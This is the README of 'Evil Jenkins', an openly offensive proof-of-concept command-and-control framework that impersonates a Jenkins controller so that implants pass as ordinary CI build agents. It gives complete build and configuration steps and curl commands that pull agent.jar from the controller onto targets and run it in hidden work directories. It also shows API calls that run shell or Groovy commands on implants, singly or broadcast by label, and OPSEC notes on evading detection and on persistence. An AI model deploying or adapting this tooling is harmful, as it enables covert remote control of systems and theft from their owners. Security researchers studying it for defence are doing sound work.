# Evil Jenkins

A command-and-control (C2) POC framework that uses the Jenkins Remoting protocol as its transport layer. By emulating a legitimate Jenkins controller, Evil Jenkins allows operators to manage implants that appear to network defenders and traffic analysis as ordinary Jenkins build agents performing CI/CD work.

Unmodified `jenkins/inbound-agent` Docker containers and native `agent.jar` instances on Linux, macOS, and Windows connect over **JNLP4-connect**, the same TLS-wrapped protocol used by production Jenkins infrastructure worldwide.

<img width="1248" height="365" alt="Screenshot_20260317_230839" src="https://github.com/user-attachments/assets/74e4c712-602f-4688-92b5-8784862c13e3" />

---

## Why Jenkins as a C2 Channel?

- **Blends into enterprise traffic.** Jenkins is common across enterprise environments. Connections from build agents to a controller on TCP 50000 likely would not raise an alert, or may be ignored.
- **TLS-encrypted by default.** JNLP4-connect negotiates a TLS session using the controller's self-signed certificate — all tasking and results travel encrypted without requiring additional infrastructure.
- **Uses a signed, trusted implant binary.** The implant is the official `agent.jar` published by the Jenkins project. It is not patched, repackaged, or otherwise modified, so it will not trigger static analysis or signature-based detection.
- **Cross-platform.** The same agent JAR runs on any OS with a JVM. Shell dispatch adapts automatically to Linux/macOS (`sh -c`) or Windows (`powershell`).

---

## Architecture

```
  ┌─────────────────────────────────────────────────────────┐
  │  Evil Jenkins Controller (Java, port 8080 + 50000)      │
  │                                                         │
  │   HTTP API  ←──── Flask UI (Python, port 5000) ────→    │
  │   port 8080         (operator console)                  │
  │                                                         │
  │   TCP port 50000 ←── implants (agent.jar / containers)  │
  └─────────────────────────────────────────────────────────┘
```

### Controller (Java / Kotlin — fat JAR)

The controller is the C2 server. It:

- Listens on **TCP 50000** for inbound JNLP4-connect handshakes using `org.jenkins-ci.main:remoting`
- Exposes an **HTTP REST API on port 8080** — all `/api/*` routes are protected by a Bearer token
- Compiles Groovy scripts into JVM bytecode on the controller side, then ships the compiled classes to implants — implants never need a Groovy compiler or ASM, so any JVM 17+ works
- Persists implant registration to `data/agents.json`
- Bundles `agent.jar` inside the fat JAR at build time; auto-downloads from Maven on first startup if not bundled

### Operator Console (Python / Flask)

A lightweight web UI on **port 5000** that proxies all `/api/*` calls to the controller, injecting the Bearer token transparently. Provides:

- **Remote shell** — interactive terminal against any connected implant
- **Implant management** — register, list, disconnect, delete
- **Download helpers** — agent JAR and launch scripts for deploying implants

Shell mode auto-detects the target OS on first use (via `System.getProperty('os.name')`) and caches the result per implant in localStorage permanently, routing commands through `sh -c` or `powershell -NonInteractive -Command` as appropriate.

---

## Prerequisites

### Java 21

Required on the machine running the controller.

**Linux (SDKMAN — recommended):**
```bash
curl -s "https://get.sdkman.io" | bash
source "$HOME/.sdkman/bin/sdkman-init.sh"
sdk install java 21.0.5-tem
```

**Ubuntu / Debian (apt):**
```bash
sudo apt update && sudo apt install -y openjdk-21-jdk
```

**macOS (Homebrew):**
```bash
brew install openjdk@21
sudo ln -sfn $(brew --prefix)/opt/openjdk@21/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk-21.jdk
```

**Windows:**
Download the OpenJDK 21 MSI from https://adoptium.net and run the installer.

Verify:
```bash
java -version   # should report 21.x
```

### Gradle 8

The repo includes `gradlew` / `gradlew.bat` wrapper scripts, so Gradle does not need to be installed separately — `./gradlew` downloads the correct version on first run.

### Python 3.8+ (operator console only)

Install via your system package manager or from https://python.org/downloads.

---

## Building

```bash
cd controller
./gradlew shadowJar
```

Produces `controller/build/libs/controller-1.0.0.jar` — a single fat JAR containing the controller, all dependencies, and a bundled `agent.jar` ready for distribution to targets.

---

## Running the Controller

```bash
java -jar controller/build/libs/controller-1.0.0.jar
```

The controller binds HTTP to **0.0.0.0:8080** (all interfaces — required so remote implants can reach `/tcpSlaveAgentListener/` for connection discovery) and TCP to **0.0.0.0:50000**. All `/api/*` routes are protected by the Bearer token.

### Configuration

Drop an `application.yml` next to the JAR to override defaults without rebuilding:

```yaml
server:
  httpHost: "0.0.0.0"       # must be 0.0.0.0 so implants can reach /tcpSlaveAgentListener/
  httpPort: 8080
  tcpPort: 50000
  baseUrl: "http://<your-host>:8080"  # used in JNLP descriptors and launch commands

identity:
  keystorePath: "data/controller.jks"
  keystorePassword: "jenkins-agent-engine"

data:
  agentsFile: "data/agents.json"
  agentJarCache: "data/agent-jar-cache"

api:
  token: "changeme-api-token"  # change this — all /api/* routes require Bearer <token>
```

---

## Running the Operator Console

```bash
cd frontend
pip install -r requirements.txt
python app.py
```

Open **http://127.0.0.1:5000** in your browser.

| Variable | Default | Description |
|---|---|---|
| `CONTROLLER_URL` | `http://localhost:8080` | Controller endpoint for the Flask proxy |
| `CONTROLLER_TOKEN` | `changeme-api-token` | Must match `api.token` in `application.yml` — injected on all proxied API calls |
| `PORT` | `5000` | Console listen port |
| `LISTEN_HOST` | `127.0.0.1` | Console bind address. Set to `0.0.0.0` to expose externally |
| `DEBUG` | `1` | Flask debug mode (`0` to disable) |

```bash
CONTROLLER_TOKEN=your-secret-token CONTROLLER_URL=http://192.168.1.x:8080 python app.py
```

---

## Deploying Implants

### 1. Register an implant (obtain a secret)

Use the **Agents** tab in the operator console, or:

```bash
curl -sX POST http://localhost:8080/api/agents \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer changeme-api-token' \
  -d '{"name":"target-01","labels":["linux","prod"]}' | jq .
```

Response:
```json
{
  "name": "target-01",
  "secret": "abc123...",
  "launchCommand": "java -jar agent.jar -url http://localhost:8080 -name target-01 -secret abc123... -workDir /opt/agent"
}
```

### 2. Execute the implant on the target

**Linux / macOS:**
```bash
curl -O http://<controller>:8080/jnlpJars/agent.jar
java -jar agent.jar \
  -url http://<controller>:8080 \
  -name target-01 \
  -secret <secret> \
  -workDir /tmp/.build
```

**Windows (cmd):**
```cmd
curl -O http://<controller>:8080/jnlpJars/agent.jar
java -jar agent.jar -url http://<controller>:8080 -name target-01 -secret <secret> -workDir C:\ProgramData\build
```

**Direct TCP (bypasses HTTP discovery):**
```bash
java -jar agent.jar \
  -direct <controller>:50000 \
  -protocols JNLP4-connect \
  -name target-01 \
  -secret <secret> \
  -workDir /tmp/.build
```

Once connected, the implant appears in the operator console and is ready to receive tasking.

---

## Tasking

### Via the Operator Console

1. Open http://127.0.0.1:5000
2. Select a connected implant from the **Target** dropdown in the Shell tab
3. **OS Shell mode** — type any command and press Enter. The console auto-detects the target OS on first use and routes through the appropriate shell. A badge next to the selector shows `sh` or `powershell` once detected
4. **Groovy Script mode** — execute arbitrary Groovy on the implant's JVM. Use `out.println(...)` or `return` a value

### Via the REST API

All `/api/*` calls require `Authorization: Bearer <token>`. Set an alias to avoid repeating it:

```bash
alias ejcurl='curl -s -H "Authorization: Bearer changeme-api-token" -H "Content-Type: application/json"'
```

**Shell command (Linux/macOS):**
```bash
ejcurl -X POST http://localhost:8080/api/execute \
  -d '{
    "script": "def proc = [\"sh\",\"-c\",\"whoami\"].execute(); proc.waitFor(); return proc.in.text",
    "target": "target-01",
    "timeoutSeconds": 30
  }' | jq .
```

**Shell command (Windows):**
```bash
ejcurl -X POST http://localhost:8080/api/execute \
  -d '{
    "script": "def proc = [\"powershell\",\"-NonInteractive\",\"-Command\",\"whoami\"].execute(); proc.waitFor(); return proc.in.text",
    "target": "win-target-01",
    "timeoutSeconds": 30
  }' | jq .
```

**Broadcast to all implants matching a label:**
```bash
ejcurl -X POST http://localhost:8080/api/execute \
  -d '{"script": "return InetAddress.localHost.hostName", "labels": ["prod"], "async": false}' | jq .
```

**Asynchronous tasking (fire and poll):**
```bash
# Fire
ID=$(ejcurl -X POST http://localhost:8080/api/execute \
  -d '{"script":"Thread.sleep(3000); return \"done\"","target":"target-01","async":true}' | jq -r .id)

# Poll
ejcurl http://localhost:8080/api/executions/$ID | jq .
```

---

## Labels

Labels are free-form tags assigned at registration (e.g. `linux`, `windows`, `prod`, `dmz`). Target by label instead of by name to broadcast a task to every matching implant simultaneously:

```json
{ "script": "...", "labels": ["prod"] }
```

Returns one result per implant.

---

## Docker Compose (Testing)

The included `docker-compose.yml` starts a controller plus two test implants for local development. May not work as intended.

```bash
AGENT_01_SECRET=$(curl -sX POST http://localhost:8080/api/agents \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer changeme-api-token' \
  -d '{"name":"agent-01","labels":["linux"]}' | jq -r .secret)

AGENT_02_SECRET=$(curl -sX POST http://localhost:8080/api/agents \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer changeme-api-token' \
  -d '{"name":"agent-02","labels":["linux"]}' | jq -r .secret)

AGENT_01_SECRET=$AGENT_01_SECRET AGENT_02_SECRET=$AGENT_02_SECRET docker compose up
```

---

## OPSEC Considerations

- **HTTP API binds to `0.0.0.0` by default** so implants can reach `/tcpSlaveAgentListener/` for connection discovery. All `/api/*` routes are token-protected.
- **TCP port 50000 is open to all interfaces** so remote implants can connect. This matches the default configuration of production Jenkins controllers, which aids in blending with legitimate infrastructure. Firewall it to trusted source IPs where possible.
- **The implant binary is unmodified.** `agent.jar` is the official Jenkins remoting JAR, extracted directly from the Maven artifact at build time. It carries no custom code and will match known hashes.
- **TLS is self-signed.** The controller generates a keystore on first run (`data/controller.jks`). Implant connections are encrypted but not pinned to a CA. This is the same as most real Jenkins deployments.
- **No persistence mechanism is included.** Establishing persistence on the target (cron, systemd, scheduled task, etc.) is left to the operator. Consider using one of the techniques outlined by Jenkins ;) https://wiki.jenkins.io/display/JENKINS/Installing+Jenkins+as+a+Windows+service
- **API token authentication** protects all `/api/*` routes. Change the default token before deployment.

### Changing the API Token

1. Edit `application.yml`:
   ```yaml
   api:
     token: "your-secret-token-here"
   ```
2. Run the operator console with the matching token:
   ```bash
   CONTROLLER_TOKEN=your-secret-token-here python app.py
   ```
3. Direct API callers must include the header:
   ```
   Authorization: Bearer your-secret-token-here
   ```

Routes that do **not** require the token (intentionally unauthenticated for Jenkins agent compatibility):
- `GET /jnlpJars/agent.jar` — implant JAR download
- `GET /tcpSlaveAgentListener/` — implant discovery headers
- `GET /computer/{name}/slave-agent.jnlp` — JNLP descriptor

---

## Protocol Internals

The controller implements **JNLP4-connect** using `org.jenkins-ci.main:remoting:3341.v0766d82b_dec0`.

**Connection handshake:**
1. Implant opens a TCP socket to port 50000
2. Implant sends a 2-byte-length-prefixed UTF-8 banner: `"Protocol:JNLP4-connect"` via `DataOutputStream.writeUTF`
3. Controller reads the banner with `DataInputStream.readUTF()` and hands the socket to `JnlpProtocol4Handler`
4. JNLP4 performs a TLS handshake using the controller's self-signed X.509 certificate (generated on first run, persisted in `data/controller.jks`)
5. Controller validates the implant name and HMAC secret via `JnlpClientDatabase`
6. A bidirectional `Channel` is established — the controller can now dispatch `Callable` objects to the implant

**Task execution:**
1. Controller compiles Groovy source into JVM bytecode (targeting JDK 17) using `CompilationUnit`
2. Compiled class bytes are embedded in a `GroovyScriptCallable` (implements `hudson.remoting.Callable`)
3. The Callable is serialised and sent to the implant over the Channel
4. Implant deserialises and executes using a custom `ClassLoader` — no Groovy compiler needed on the target
5. Output is captured via a bound `PrintWriter` and returned as a `String`

**Key remoting classes:**
- `JnlpProtocol4Handler` — TLS handshake and capability negotiation
- `JnlpClientDatabase` — implant name/secret validation
- `JnlpConnectionStateListener` — connection lifecycle callbacks (`afterProperties`, `afterChannel`)
- `Channel` — bidirectional RPC (`channel.call`, `channel.callAsync`, `channel.preloadJar`)
- `PingThread` — keepalive heartbeat; closes the channel on timeout

---

## API Reference

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| POST | `/api/agents` | Bearer | Register a new implant |
| GET | `/api/agents` | Bearer | List all implants |
| GET | `/api/agents/{name}` | Bearer | Implant details + secret |
| DELETE | `/api/agents/{name}` | Bearer | Delete implant |
| POST | `/api/agents/{name}/disconnect` | Bearer | Disconnect channel |
| POST | `/api/execute` | Bearer | Dispatch task to implant(s) |
| GET | `/api/executions` | Bearer | Execution history |
| GET | `/api/executions/{id}` | Bearer | Single execution result |
| POST | `/api/executions/{id}/cancel` | Bearer | Cancel running execution |
| POST | `/api/agent-jar/generate` | Bearer | Regenerate implant JAR |
| GET | `/api/agents/{name}/launch-script` | Bearer | Download bash launch script |
| GET | `/api/agents/{name}/docker-compose.yml` | Bearer | Download Docker Compose snippet |
| GET | `/jnlpJars/agent.jar` | None | Download implant JAR |
| GET | `/tcpSlaveAgentListener/` | None | Jenkins-compatible discovery endpoint |
| GET | `/computer/{name}/slave-agent.jnlp` | None | JNLP descriptor for implant |
